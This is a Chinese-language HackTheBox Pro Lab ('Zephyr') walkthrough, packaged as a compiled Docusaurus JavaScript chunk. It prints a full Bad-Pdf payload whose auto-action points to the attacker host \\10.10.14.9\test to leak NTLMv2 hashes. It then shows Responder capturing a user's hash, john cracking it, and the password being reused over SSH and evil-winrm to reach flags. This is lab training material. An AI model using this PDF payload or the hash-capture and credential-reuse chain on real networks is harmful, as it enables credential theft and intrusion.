"use strict";(self.webpackChunkrookie=self.webpackChunkrookie||[]).push([[901],{8031:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>i,default:()=>c,frontMatter:()=>t,metadata:()=>a,toc:()=>l});var s=r(4848),o=r(8453);const t={toc_max_heading_level:6},i="Zephyr",a={id:"\u9776\u573a/HTB-prolabs/Zephyr",title:"Zephyr",description:"\u573a\u666f\u63cf\u8ff0",source:"@site/docs/\u9776\u573a/HTB-prolabs/Zephyr.md",sourceDirName:"\u9776\u573a/HTB-prolabs",slug:"/\u9776\u573a/HTB-prolabs/Zephyr",permalink:"/S0rry/docs/\u9776\u573a/HTB-prolabs/Zephyr",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{toc_max_heading_level:6},sidebar:"BC_Sidebar",previous:{title:"HTB-prolabs",permalink:"/S0rry/docs/category/htb-prolabs"}},d={},l=[{value:"\u573a\u666f\u63cf\u8ff0",id:"\u573a\u666f\u63cf\u8ff0",level:2},{value:"10.10.110.0/24(nmap)",id:"1010110024nmap",level:2},{value:"10.10.110.35(\u5165\u53e3\u673a\u3001\u7f51\u5361\u4e00\\mail)",id:"101011035\u5165\u53e3\u673a\u7f51\u5361\u4e00mail",level:3},{value:"\u5236\u4f5cbadpdf",id:"\u5236\u4f5cbadpdf",level:4},{value:"\u53d1\u73b0\u5185\u7f51\u6bb5192.168.110.*",id:"\u53d1\u73b0\u5185\u7f51\u6bb5192168110",level:4},{value:"arp\u55c5\u63a2",id:"arp\u55c5\u63a2",level:5},{value:"192.168.110.56()",id:"19216811056",level:2},{value:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646",id:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646",level:3},{value:"0000",id:"0000",level:4},{value:"1111",id:"1111",level:5},{value:"7777",id:"7777",level:6}];function p(n){const e={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",h5:"h5",h6:"h6",img:"img",mdxAdmonitionTitle:"mdxAdmonitionTitle",p:"p",pre:"pre",...(0,o.R)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"zephyr",children:"Zephyr"}),"\n",(0,s.jsx)(e.h2,{id:"\u573a\u666f\u63cf\u8ff0",children:"\u573a\u666f\u63cf\u8ff0"}),"\n",(0,s.jsx)(e.h2,{id:"1010110024nmap",children:"10.10.110.0/24(nmap)"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# nmap 10.10.110.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:01 CST\nNmap scan report for bogon (10.10.110.2)\nHost is up (0.40s latency).\nAll 1000 scanned ports on bogon (10.10.110.2) are in ignored states.\nNot shown: 1000 filtered tcp ports (no-response)\n\nNmap scan report for painters.htb (10.10.110.35)\nHost is up (0.27s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\nNmap done: 256 IP addresses (2 hosts up) scanned in 87.62 seconds\n"})}),"\n",(0,s.jsx)(e.h3,{id:"101011035\u5165\u53e3\u673a\u7f51\u5361\u4e00mail",children:"10.10.110.35(\u5165\u53e3\u673a\u3001\u7f51\u5361\u4e00\\mail)"}),"\n",(0,s.jsx)(e.p,{children:"\u8be6\u7ec6\u7248\u672c\u626b\u63cf"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop/Bad-Pdf]\n\u2514\u2500# nmap -sV -sC -p22,80,445 10.10.110.35\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 08:55 CST\nNmap scan report for painters.htb (10.10.110.35)\nHost is up (0.20s latency).\n\nPORT    STATE    SERVICE      VERSION\n22/tcp  open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)\n|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)\n|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)\n80/tcp  open     http         nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to https://painters.htb/home\n445/tcp filtered microsoft-ds\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsxs)(e.admonition,{type:"warning",children:[(0,s.jsx)(e.mdxAdmonitionTitle,{}),(0,s.jsxs)(e.p,{children:["\u56e0\u4e3a\u8bbf\u95ee10.10.110.35\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u89e3\u6790\u6210",(0,s.jsx)(e.code,{children:"https://painters.htb/home"}),"\u5bfc\u81f4\u4e0d\u80fd\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u628a\u57df\u540d\u548cip\u7ed1\u5b9a\uff0c\u5373hosts  -> 10.10.110.35 painters.htb"]})]}),"\n",(0,s.jsxs)(e.p,{children:["vacancies\n",(0,s.jsx)(e.img,{alt:"alt text",src:r(5823).A+"",width:"2289",height:"1310"}),"\n\u53d1\u73b0\u53ef\u4ee5\u4e0a\u4f20pdf\n",(0,s.jsx)(e.img,{alt:"alt text",src:r(4061).A+"",width:"2255",height:"1246"})]}),"\n",(0,s.jsxs)(e.admonition,{type:"tip",children:[(0,s.jsx)(e.mdxAdmonitionTitle,{}),(0,s.jsx)(e.p,{children:"\u7ecf\u8fc7Lamber\u63d0\u9192\uff0c\u6240\u4ee5\u77e5\u9053bad-pdf\u9493\u9c7c\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb"})]}),"\n",(0,s.jsx)(e.h4,{id:"\u5236\u4f5cbadpdf",children:"\u5236\u4f5cbadpdf"}),"\n",(0,s.jsxs)(e.p,{children:["GitHub\u5bfb\u627e\u9879\u76ee",(0,s.jsx)(e.code,{children:"https://github.com/deepzec/Bad-Pdf"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop/Bad-Pdf]\n\u2514\u2500# cat hf.pdf                                                \n\n%PDF-1.7\n\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>\nendobj\nxref\n0 4\n0000000000 65535 f\n0000000015 00000 n\n0000000060 00000 n\n0000000111 00000 n\ntrailer\n<</Size 4/Root 1 0 R>>\nstartxref\n190\n3 0 obj\n<< /Type /Page\n   /Contents 4 0 R\n\n   /AA <<\n           /O <<\n              /F (\\\\\\\\10.10.14.9\\\\test)\n                  /D [ 0 /Fit]\n                  /S /GoToE\n                  >>\n\n           >>\n\n           /Parent 2 0 R\n           /Resources <<\n                        /Font <<\n                                /F1 <<\n                                        /Type /Font\n                                        /Subtype /Type1\n                                        /BaseFont /Helvetica\n                                        >>\n                                  >>\n                                >>\n>>\nendobj\n\n\n4 0 obj<< /Length 100>>\nstream\nBT\n/TI_0 1 Tf\n14 0 0 14 10.000 753.976 Tm\n0.0 0.0 0.0 rg\n(PDF Document) Tj\nET\nendstream\nendobj\n\n\ntrailer\n<<\n        /Root 1 0 R\n>>\n\n%%EOF\n\n"})}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsxs)(e.p,{children:["\u672c\u8d28\u662fhr\u5728\u5e26\u6709\u8001\u7248\u672c\u7684adobe\u57df\u5185\u70b9\u51fb\u4e86badpdf\uff0c\u5bfc\u81f4NTLMv2-SSP Hash\u53d1\u9001\u5230",(0,s.jsx)(e.code,{children:"\\\\\\\\10.10.14.9\\\\test"}),",\u6240\u4ee5\u6211\u4eec\u5f00\u59cb\u76d1\u542c\u5c31\u597d\u4e86"]})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"player@HTB-pro-labs:~$ sudo /root/github/Responder/Responder.py -I tun0 -F -v\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.4.0\n\n  To support this project:\n  Github -> https://github.com/sponsors/lgandx\n  Paypal  -> https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    MDNS                       [ON]\n    DNS                        [ON]\n    DHCP                       [OFF]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    MQTT server                [ON]\n    RDP server                 [ON]\n    DCE-RPC server             [ON]\n    WinRM server               [ON]\n    SNMP server                [OFF]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [OFF]\n    Force WPAD auth            [ON]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Force ESS downgrade        [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.9]\n    Responder IPv6             [dead:beef:2::1007]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']\n    TTL for poisoned response  [default]\n\n[+] Current Session Variables:\n    Responder Machine Name     [WIN-MHEQOF5VP8L]\n    Responder Domain Name      [PO9L.LOCAL]\n    Responder DCE-RPC Port     [48062]\n\n[+] Listening for events...\n\n[!] Error starting SSL server on port 5986, check permissions or other servers running.\n[!] Error starting SSL server on port 443, check permissions or other servers running.\n[!] Error starting SSL server on port 636, check permissions or other servers running.\n[SMB] NTLMv2-SSP Client   : 10.10.110.35\n[SMB] NTLMv2-SSP Username : PAINTERS\\riley\n[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:53c64658d8d385f2:D5400AE66AF0FEAA810A5BA5D28C2E3F:010100000000000080D5D41498B5DA015CFAE691A8785C93000000000200080050004F0039004C0001001E00570049004E002D004D004800450051004F00460035005600500038004C0004003400570049004E002D004D004800450051004F00460035005600500038004C002E0050004F0039004C002E004C004F00430041004C000300140050004F0039004C002E004C004F00430041004C000500140050004F0039004C002E004C004F00430041004C000700080080D5D41498B5DA01060004000200000008003000300000000000000000000000002000009362064276D8FE84BF59334519405635765FD93A3A806E37B16B1DF51AF65E190A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0039000000000000000000\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u62ff\u5230hash\u7684\u65f6\u5019\u7b2c\u4e00\u65f6\u95f4\u5c31\u60f3\u5230\u7206\u7834"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"\u250c\u2500\u2500(rookie\u327fRookie)-[~/Desktop]\n\u2514\u2500$ john aaa -wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nP@ssw0rd         (riley)     \n1g 0:00:00:00 DONE (2024-06-03 17:56) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n"})}),"\n",(0,s.jsx)(e.admonition,{title:"\u95ee\u9898",type:"danger",children:(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"1\u3001\u5728Linux\u7684web\u7f51\u9875\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u53cd\u5f39\u51faNTLMv2-SSP Hash \n2\u3001\u4e3a\u4ec0\u4e48Linux\u7528NTLMv2-SSP Hash\u7684\u8d26\u6237\u5bc6\u7801\u767b\u9646\n"})})}),"\n",(0,s.jsx)(e.admonition,{title:"\u56de\u7b54",type:"tip",children:(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"1\u3001web\u7f51\u9875\u53ea\u8d1f\u8d23\u6536\u96c6pdf\uff0c\u800chr\u5de5\u4f5c\u7684\u5730\u65b9\u662fWindows\u73af\u5883\uff0chr\u5728\u57df\u5185\u70b9\u51fb\u67e5\u770b\n2\u3001\u5bc6\u7801\u590d\u7528\uff0c\u662f\u57df\u5185\u5f88\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\n"})})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u767b\u9646"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop/Bad-Pdf]\n\u2514\u2500# ssh riley@10.10.110.35 \nriley@10.10.110.35's password: P@ssw0rd\n\nriley@mail:~$ ls\nagent  flag.txt  nmap \nriley@mail:~$ cat flag.txt \nZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}  #\u4eba\u7c7b\u7684\u9519\u8bef\u662f\u81f4\u547d\u7684\n"})}),"\n",(0,s.jsx)(e.h4,{id:"\u53d1\u73b0\u5185\u7f51\u6bb5192168110",children:"\u53d1\u73b0\u5185\u7f51\u6bb5192.168.110.*"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"riley@mail:~$ ifconfig\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.110.51  netmask 255.255.255.0  broadcast 192.168.110.255\n        inet6 fe80::250:56ff:fe94:c339  prefixlen 64  scopeid 0x20<link>\n        ether 00:50:56:94:c3:39  txqueuelen 1000  (Ethernet)\n        RX packets 39041  bytes 32330274 (32.3 MB)\n        RX errors 0  dropped 51  overruns 0  frame 0\n        TX packets 33522  bytes 16083072 (16.0 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 32560  bytes 2332756 (2.3 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 32560  bytes 2332756 (2.3 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"})}),"\n",(0,s.jsx)(e.h5,{id:"arp\u55c5\u63a2",children:"arp\u55c5\u63a2"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"riley@mail:~$ arp -a\n? (192.168.110.56) at 00:50:56:b9:84:a9 [ether] on eth0\n? (192.168.110.53) at 00:50:56:b9:aa:8d [ether] on eth0\n? (192.168.110.52) at 00:50:56:b9:dc:9e [ether] on eth0\n? (192.168.110.55) at 00:50:56:b9:75:58 [ether] on eth0\n? (192.168.110.54) at 00:50:56:b9:cc:cd [ether] on eth0\n_gateway (192.168.110.1) at 00:50:56:b9:fb:40 [ether] on eth0\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u53d1\u73b0\u5982\u4e0bip"}),"\n",(0,s.jsx)(e.admonition,{type:"info",children:(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"192.168.110.1  (firewall)\n192.168.110.51 (\u5165\u53e3\u673a\u3001\u7f51\u5361\u4e8c)\n192.168.110.52\n192.168.110.53\n192.168.110.54\n192.168.110.55\n192.168.110.56\n"})})}),"\n",(0,s.jsx)(e.h2,{id:"19216811056",children:"192.168.110.56()"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:'riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.56\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-05 06:33 UTC\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 192.168.110.56\nHost is up (0.00056s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE\n5985/tcp open  unknown\n'})}),"\n",(0,s.jsx)(e.h3,{id:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646",children:"\u5c1d\u8bd5\u4f7f\u7528\u57df\u5185\u7528\u6237riley\u767b\u9646"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# proxychains evil-winrm -u riley -p P@ssw0rd  -i 192.168.110.56\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.5\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  192.248.165.125:58888  ...  192.168.110.56:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\riley\\Documents>\n*Evil-WinRM* PS C:\\Users\\riley\\Documents> cd ../../Administrator/Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type flag.txt\nZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}\n"})}),"\n",(0,s.jsx)(e.h4,{id:"0000",children:"0000"}),"\n",(0,s.jsx)(e.h5,{id:"1111",children:"1111"}),"\n",(0,s.jsx)(e.h6,{id:"7777",children:"7777"})]})}function c(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(p,{...n})}):p(n)}},4061:(n,e,r)=>{r.d(e,{A:()=>s});const s=r.p+"assets/images/892ca35c0c7e15202d018de3551cb2a5-e7bc6237b938e94be8844f78cb290c64.png"},5823:(n,e,r)=>{r.d(e,{A:()=>s});const s=r.p+"assets/images/dcd974d1753777a23a684d4dcedd47d4-6ebb23e3fe637a34a37334ec20c7683c.png"},8453:(n,e,r)=>{r.d(e,{R:()=>i,x:()=>a});var s=r(6540);const o={},t=s.createContext(o);function i(n){const e=s.useContext(t);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:i(n.components),s.createElement(t.Provider,{value:e},n.children)}}}]);